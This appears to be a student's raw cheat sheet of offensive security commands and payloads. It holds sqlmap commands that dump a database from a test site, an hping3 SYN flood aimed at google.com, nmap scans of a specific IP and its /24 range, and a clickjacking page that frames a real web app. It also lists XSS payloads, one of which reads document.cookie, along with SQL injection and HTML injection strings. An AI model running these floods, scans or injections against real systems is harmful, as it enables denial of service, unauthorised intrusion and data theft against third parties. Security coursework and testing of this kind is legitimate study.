# css

ping -c 5 1.1.1.1
whois example.com
nslookup example.com
traceroute 8.8.8.8
ifconfig

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T carts --columns
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T carts -C item --dump

sudo apt-get -y install hping3
sudo hping3 -S --flood -V -p 80 google.com

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking</title>
</head>
<style>
    iframe{
        opacity: 0.1;
    }
    button	        position: absolute;
        top: 485px;
        left: 175px;
    }
</style>
<body>
    <h2>Clickjacking Demo Page (iframe)</h2><br/>
    <iframe src="https://study-notion-frontend-wheat.vercel.app/" height="500px" width="500px"></iframe>
    <button>click me </button>
</body>
</html>


ping -c 5 www.tcetmumbai.in
nmap -sT 162.241.71.29 (tcp scan)
sudo nmap -sX 162.241.71.29 (xmas scan)
sudo nmap -O 162.241.71.29 (os fingerprinting)
sudo nmap -sn 162.241.71.29/24 (ping scanning)
sudo nmap 162.241.71.29 (port scanning)

***xxs payloads***
<div>
  <h2>{{name}}</h2>
</div>
<div>
  <h2><script>alert("xss")</script></h2>
</div>
<button onClick="alert('xss')">Submit</button>
<body/onfocus=top.alert(17)>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>

***sql injection attack***
 OR 1=1-- 
 OR 1=0-- 
 OR x=x-- 
 OR x=y-- 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --

***html injection attack***
<h5>HTML</h5>
<h6>HTML</h6>
<pre>HTML</pre>
<p>HTML</p>
<i>HTML</i>
<a href="https://www.google.com">HTML</a>
<abbr title="HTML">HTML</abbr>
<acronym title="Armour Infosec">AI</acronym>
<address>address,address</address>
<article><h2>Armour Infosec</h2></article>
<iframe src="https://www.google.com" title="test"></iframe>
123<h1>HTML</h1>
<h1>HTML</h1>123
123<h1>HTML</h1>123
%253Ch1%253EHTML%253C%252Fh1%253E
<iframe id="if1" src="https://www.google.com"></iframe>
<iframe id="if2" src="https://www.google.com"></iframe>
